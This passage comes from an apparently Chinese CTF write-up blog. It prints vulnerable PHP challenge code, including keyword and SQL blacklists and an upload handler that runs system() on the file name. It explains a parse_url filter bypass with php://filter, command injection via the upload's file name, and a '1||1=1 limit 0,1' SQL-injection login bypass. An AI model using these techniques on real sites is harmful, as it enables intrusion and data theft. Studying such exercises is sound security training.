class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])|| <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;info&#x27;</span>)<br>        &#123;<br><span class="hljs-comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span><br>            <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: user.php?page=guest&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">filter_directory</span>();<br><span class="hljs-comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><br><span class="hljs-comment">//    $page = &#x27;info&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$page</span>.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hacker</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: hacker.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory_guest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;<br>    <span class="hljs-variable">$whitelist</span> = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$whitelist</span>&quot;</span>, <span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]) === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-title function_ invoke__">Hacker</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$blacklist</span>/is&quot;</span>, <span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">Hacker</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">real_escape_string</span>(<span class="hljs-variable">$string</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_query</span>(<span class="hljs-params"><span class="hljs-variable">$sql_query</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql_query</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="hljs-subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="hljs-subst">$pass</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>-&gt;num_rows) &#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$res</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$data</span>[username_which_you_do_not_know];<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] = <span class="hljs-variable">$data</span>[isadmin_which_you_do_not_know_too_too];<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateadmin</span>(<span class="hljs-params"><span class="hljs-variable">$level</span>,<span class="hljs-variable">$user</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="hljs-subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="hljs-subst">$user</span>&#x27; &quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br><span class="hljs-comment">//    die($res);</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span> == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="hljs-subst">$user</span>&#x27;,&#x27;<span class="hljs-subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;insert_id;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">session_destroy</span>();<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>其中主要的源码就是user.php和function.php<br>在function.php里发现</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$keywords = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>]<span class="hljs-comment">;</span><br>    $uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>])<span class="hljs-comment">;</span><br>    parse_str($uri[<span class="hljs-string">&#x27;query&#x27;</span>], $query)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>无法直接读到flag文件，这里用parse_url解析漏洞绕过。<br><strong>parse_url:</strong><br>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。 本函数不是用来验证给定 URL 的合法性的，只是将其分解为下面列出的部分。不完整的 URL 也被接受，parse_url() 会尝试尽量正确地将其解析。<br>本地测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://127.0.0.1/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>));<br><br><br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123; [<span class="hljs-string">&quot;scheme&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span> [<span class="hljs-string">&quot;host&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;127.0.0.1&quot;</span> [<span class="hljs-string">&quot;path&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;/user.php&quot;</span> [<span class="hljs-string">&quot;query&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">57</span>) <span class="hljs-string">&quot;page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg&quot;</span> &#125;<br></code></pre></td></tr></table></figure>


<p>再看看<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>的返回值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://127.0.0.1/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>];<br><br>/user.php?page=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=ffffllllaaaaggg</span><br></code></pre></td></tr></table></figure>


<p>题目源码的意思是对<code>$_SERVER[‘REQUEST_URI’]</code>进行parse_url解析。<br><img src="/images/e253a54ba969d9510e831dc0985269b6.png" srcset="/img/loading.gif" lazyload><br>用伪协议直接读ffffllllaaaaggg会被检测到</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl">$keywords = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>];<br>    $uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    parse_str($uri[<span class="hljs-string">&#x27;query&#x27;</span>], $query);<br><span class="hljs-regexp">//</span>    var_dump($query);<br><span class="hljs-regexp">//</span>    <span class="hljs-keyword">die</span>();<br>    <span class="hljs-keyword">foreach</span>($keywords as $token)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>($query as $k =&gt; $v)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (stristr($k, $token))<br>                hacker();<br>            <span class="hljs-keyword">if</span> (stristr($v, $token))<br>                hacker();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>有一个办法是使parse_url解析出错，从而无法进入下面的foreach判断。<br>只要在user.php前面加上三个&#x2F;</p>
<p><img src="/images/2973B6CF70324a258FE7FD227DC1A35B.png" srcset="/img/loading.gif" lazyload></p>
<p>ffffllllaaaaggg</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can find sth in m4aaannngggeee&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>在读m4aaannngggeee</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/upload.html&quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>去这个链接看看<br><img src="/images/2A1010BA98024b33AA28831B71F81080.png" srcset="/img/loading.gif" lazyload><br>有个上传按钮，但貌似并不能上传<br>源码找到一个php文件，读一下这个</p>
<p>upllloadddd.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowtype</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);<br><span class="hljs-variable">$size</span> = <span class="hljs-number">10000000</span>;<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file&quot;</span>);<br>&#125;<br><span class="hljs-variable">$newfile</span> = <span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$picdata</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="hljs-variable">$picdata</span>.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);<br>&#125;<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$allowtype</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>访问m4aaannngggeee页面<br><img src="/images/516956C364B64a929CD329C49436D794.png" srcset="/img/loading.gif" lazyload><br>这个文件上传倒是能用</p>
<p>我们可以利用这个</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">$picdata = <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>filename是文件名，所以我们上传文件时抓包，文件名做个文章<br><img src="/images/F7C02DB11BB84f87B47DCB73E333AE6D.png" srcset="/img/loading.gif" lazyload><br>不知道为什么用不了&#x2F;，也没看到过滤啊<br>用cd替代<br><img src="/images/E37CF01B59844c219711908A71008C97.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/9693C5456E5049c3B32227886A79A074.png" srcset="/img/loading.gif" lazyload><br>在本地测试一下，没有任何问题<br>分号闭合，#注释后面的语句</p>
<h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p><img src="/images/FE67EA5EF43342f3B28D20C240B38382.png" srcset="/img/loading.gif" lazyload><br>先输入一个1<br><img src="/images/65E02426E997405093F09FDF3622E9BD.png" srcset="/img/loading.gif" lazyload><br>单引号闭合下<br>页面空白，看来是过滤了<br>通过反斜杠报错发现确实是单引号闭合<br>这里要上万能密码<br>经过试错可知or被禁用了，用||代替，limit0，1，返回一行数据</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>||<span class="hljs-number">1</span>=<span class="hljs-number">1</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>获得flag，看来是登录就给flag</p>
